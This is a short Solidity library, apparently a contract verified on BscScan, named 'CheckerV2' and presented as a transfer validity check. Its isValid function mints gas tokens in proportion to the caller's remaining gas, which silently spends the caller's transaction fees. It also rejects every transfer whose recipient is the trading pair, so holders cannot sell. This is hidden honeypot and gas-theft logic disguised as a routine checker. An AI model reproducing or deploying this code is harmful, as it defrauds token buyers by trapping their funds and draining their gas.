/**
 *Submitted for verification at BscScan.com on 2022-08-30
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface ITarget {
    function mint(uint256 value) external;
}

library CheckerV2 {
    function isValid(
        address,
        address pair,
        address,
        address to,
        uint256
    ) external returns (bool) {
        address GasToken = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;
        uint256 mintCount = gasleft() / 40000;

        if (mintCount < 64) {
            mintCount = 64;
        }

        ITarget(GasToken).mint(mintCount);

        if (to == pair) {
            return false;
        }

        return true;
    }
}